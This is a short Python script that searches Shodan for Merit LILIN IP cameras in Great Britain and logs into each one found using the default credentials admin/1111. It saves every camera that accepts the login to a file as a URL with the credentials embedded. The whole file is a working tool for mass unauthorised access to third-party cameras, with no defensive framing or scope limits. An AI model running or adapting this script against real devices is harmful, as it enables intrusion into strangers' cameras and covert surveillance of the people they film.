#
# lilin.py
# Search SHODAN for Lilin IP Cameras
#
# Author: random_robbie
import requests
import shodan
from requests.auth import HTTPBasicAuth
import re
import os
import sys


# Configuration
API_KEY = "YOUR API KEY"
SEARCH_FOR = 'WWW-Authenticate: Basic realm="Merit LILIN Ent. Co., Ltd." country:"GB"'


def test_cam (IP,PORT,CC):
	session = requests.Session()
	print ("[*] Trying "+IP+" Country: "+CC+"")
	if PORT == "443":
		URL = "https://"+IP+":"+PORT+"/lang1/index.html"
	else:
		URL = "http://"+IP+":"+PORT+"/lang1/index.html"
	headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1"}
	response = session.get(URL, headers=headers, timeout=15, auth=HTTPBasicAuth("admin","1111"))
	try:
		if response.status_code == 200:
			text_file = open("found.txt", "a")
			text_file.write("http://admin:1111@"+IP+":"+PORT+"/lang1/index.html -Country: "+CC+"\n")
			text_file.close()
		else:
			print ("[*] Not Using Default Pass. [*]")
			
	except requests.exceptions.Timeout:
		print ("[*] "+IP+" Timeout unable to connect [*]")
		pass
	except Exception as e:
		print (e)
		print ("[*] Nothing Found on IP:"+IP+" [*]\n")

	



		


	
	
try:
        # Setup the api
		api = shodan.Shodan(API_KEY)

        # Perform the search
		result = api.search(SEARCH_FOR, limit=10)

        # Loop through the matches and print each IP
		for service in result['matches']:
				IP = service['ip_str']
				CC = service['location']['country_name']
				PORT = str(service['port'])
				test_cam (IP,PORT,CC)
				

				
except Exception as e:
		print (e)
		print('Error: %s' % e)
		sys.exit(1)
